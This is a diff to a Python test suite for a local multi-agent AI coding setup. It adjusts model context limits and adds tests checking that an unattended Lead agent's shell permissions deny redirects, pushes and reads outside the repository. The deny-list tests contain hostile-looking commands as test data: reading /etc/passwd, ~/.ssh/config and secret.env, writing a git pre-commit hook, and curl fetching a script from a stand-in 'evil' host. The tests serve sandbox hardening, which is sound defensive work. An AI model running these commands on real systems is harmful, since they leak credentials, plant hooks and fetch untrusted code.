@@ -101,7 +101,8 @@ class TeamModelTests(unittest.TestCase):
                     "agents": {"processes": {}}}
             return policy.level(snap, cfg)[0]
         self.assertEqual(level(87.3), "caution")       # the idle level that got job 66 refused at 85%
-        self.assertEqual(level(89.0), "restrict")
+        self.assertEqual(level(88.9), "caution")       # the working level that held jobs 109-114 at 88%
+        self.assertEqual(level(89.5), "restrict")
         self.assertEqual(level(91.0), "block")
 
     def test_opencode_limits_match_the_loaded_context(self):
@@ -109,7 +110,37 @@ class TeamModelTests(unittest.TestCase):
         self.assertEqual(sorted(models), ["fo4-implement", "fo4-lead", "fo4-qa", "fo4-research"])
         for name, model in models.items():
             self.assertEqual(model["limit"]["context"], load_model.DEFAULT_CONTEXT, name)
-            self.assertEqual(model["limit"]["output"], 32768, name)
+            self.assertEqual(model["limit"]["output"], 16384, name)
+            # OpenCode compacts at context minus min(output, 32000); the Lead's sessions reached 46K tokens
+            self.assertGreaterEqual(model["limit"]["context"] - min(model["limit"]["output"], 32000), 46000, name)
+
+    def test_the_unattended_lead_commits_only_through_the_wrapper(self):
+        self.assertIn("lead_commit.py", read("run-lead.ps1"))
+        lead = read(os.path.join(".opencode", "agents", "fo4-lead.md"), ROOT)
+        self.assertRegex(lead, r'"python -I tools/ai-team/lead_commit.py \*": allow')
+        self.assertIn("python -I tools/ai-team/lead_commit.py", read("run-lead.ps1"))
+        self.assertNotRegex(lead, r'"git (add|commit)[^"]*": allow')   # no raw git writes
+        self.assertRegex(lead, r'"git push\*": deny')
+        self.assertRegex(lead, r'"gh pr review\*": deny')
+        self.assertRegex(lead, r'"gh pr comment\*": deny')
+        self.assertRegex(lead, r'"docs/ai/\*\*": allow')         # the only files it may edit
+
+    def test_run_lead_checks_branch_and_in_progress_before_pulling_and_logs_the_pull(self):
+        script = read("run-lead.ps1")
+        self.assertNotRegex(script, r"pull[^\n]*2>\$null")          # a failed pull is no longer silent
+        self.assertIn("git pull of main failed", script)
+        self.assertRegex(script, r"ls-files -u[\s\S]{0,200}skipped: unmerged files")
+        self.assertRegex(script, r"unmerged files[^\n]*\$pull")     # the stash/pull output is logged on that skip
+        # the branch and the in-progress-operation checks run BEFORE the pull, so no other branch is rebased and no
+        # stopped rebase/merge/cherry-pick starts a session on a half-done state (the pull itself can leave those)
+        self.assertIn("CHERRY_PICK_HEAD", script)
+        self.assertLess(script.index("rev-parse --abbrev-ref HEAD"), script.index("pull -q --rebase"))
+        self.assertLess(script.index("CHERRY_PICK_HEAD"), script.index("pull -q --rebase"))
+        # the worktree must be ON ai/local-lead and SKIP otherwise, so a moved worktree's other branch is never rebased
+        self.assertRegex(script, r"rev-parse --abbrev-ref HEAD[\s\S]{0,200}'ai/local-lead'[\s\S]{0,200}skipped")
+
+    def test_start_team_names_the_loaders_context(self):
+        self.assertIn(f"load_model.py ({load_model.DEFAULT_CONTEXT // 1024}K", read("start-team.ps1"))
 
     def test_provider_header_timeout_outlasts_guardians_queue_wait(self):
         # OpenCode gives up when response headers take longer than headerTimeout. Guardian holds a queued request
@@ -120,10 +151,10 @@ class TeamModelTests(unittest.TestCase):
 
 
 class LoadConfigTests(unittest.TestCase):
-    def test_defaults_are_128k_unquantized_and_unmapped(self):
+    def test_defaults_are_64k_unquantized_and_unmapped(self):
         self.assertEqual(load_model.DEFAULT_MODEL, "qwen3.6-35b-a3b")
         cfg = load_model.load_config()
-        self.assertEqual(cfg, {"contextLength": 131072, "tryMmap": False, "keepModelInMemory": False,
+        self.assertEqual(cfg, {"contextLength": 65536, "tryMmap": False, "keepModelInMemory": False,
                                "flashAttention": True, "llamaKCacheQuantizationType": "f16",
                                "llamaVCacheQuantizationType": "f16"})
 
@@ -141,14 +172,32 @@ class LeadPromptTests(unittest.TestCase):
         self.assertIn("Stay in your worktree", text)
         rules = agent_bash_rules("fo4-lead")
         for command in ("gh issue list --state all --limit 15", "gh issue view 32",
-                        "python tools/ai-team/guardian/guardian.py status"):
+                        "python tools/ai-team/guardian/guardian.py status",
+                        "python -I tools/ai-team/lead_commit.py 'refresh agent status'"):
             self.assertEqual(verdict(rules, command), "allow", command)
+        # a redirect behind an allowed command (OpenCode matches it as part of the text) is denied, as is lead_commit
+        # without -I and any raw git write
+        for command in ("git log -1 --format=tformat:x > tools/ai-team/argparse.py",
+                        "python -I tools/ai-team/lead_commit.py x > a", "gh issue view 32 2>&1",
+                        "python tools/ai-team/lead_commit.py x", "git commit -m x"):
+            self.assertIn(verdict(rules, command), ("deny", "ask"), command)
+        self.assertEqual(verdict(rules, "git log -1 > .git/hooks/pre-commit"), "deny")
+        self.assertEqual(verdict(rules, "git log -1 --format=tformat:x --output=tools/ai-team/guardian/argparse.py"), "deny")
+        self.assertEqual(verdict(rules, "git diff --no-index /dev/null ../../outside/secret.txt"), "deny")
+        # pipe filters stay unallowed (with a path argument they would read files outside the worktree); the prompt
+        # tells the Lead to run gh and git without pipes instead
+        for command in ("head -200", "grep -r token C:/Users"):
+            self.assertEqual(verdict(rules, command), "ask", command)
+        self.assertIn("without pipes", read("run-lead.ps1"))
+        for command in ("gh pr review 5 -c -b hi", "gh pr review 5 --approve", "gh pr comment 5 -b hi"):
+            self.assertEqual(verdict(rules, command), "deny", command)
 
 
 class BashRuleTests(unittest.TestCase):
     # Each command writes a file (a redirect, an --output flag, --no-index) or reads one outside the repo. The last
-    # three reach outside without the --no-index flag: git switches to no-index on its own when a path is outside the
-    # worktree, so a drive-letter path, a leading-slash absolute path and a ../ climb all read an outside file.
+    # six reach outside without the --no-index flag: git switches to no-index on its own when a path is outside the
+    # worktree, so a drive-letter path, a leading-slash absolute path, a ~ or $ the shell expands, and a ../ climb all
+    # read an outside file.
     WRITES_OR_READS = (
         "git log > x", "git status > x", "git diff >> x", "git log --output=x", "git log -p --output x",
         "git show --output=x", "git diff --output=x", "git diff --no-index ~/.ssh/config x",
@@ -198,6 +247,21 @@ class BashRuleTests(unittest.TestCase):
         # The last matching rule wins, so no allow may come after the redirect deny.
         for agent in AGENTS:
             self.assertEqual(agent_bash_rules(agent)[-1], ("*>*", "deny"), agent)
+
+    def test_root_config_denies_redirects_and_file_options(self):
+        # The root opencode.json rules apply to any invocation, including a bare `opencode run` with no agent. They
+        # must carry the broad redirect/output/no-index denies, not only the git-specific ones, or a redirect on an
+        # allowed git read command writes an arbitrary file at the root level. "*>*" must be the LAST root rule so it
+        # stays effective (last match wins), matching the per-agent convention.
+        root = list(json.loads(read("opencode.json", ROOT))["permission"]["bash"].items())
+        self.assertEqual(root[-1], ("*>*", "deny"))
+        for pattern in ("*>*", "*--output*", "*--no-index*"):
+            self.assertIn(pattern, dict(root))
+        for win32 in (False, True):
+            for command in ("git diff HEAD > /tmp/leak", "git show HEAD:secret.env > /tmp/x",
+                            "cat /etc/passwd > /tmp/x", "curl https://evil/p --output /tmp/p.sh",
+                            "pip download --no-index --find-links /tmp/evil pkg"):
+                self.assertEqual(verdict(root, command, win32), "deny", (win32, command))
 
 
 if __name__ == "__main__":
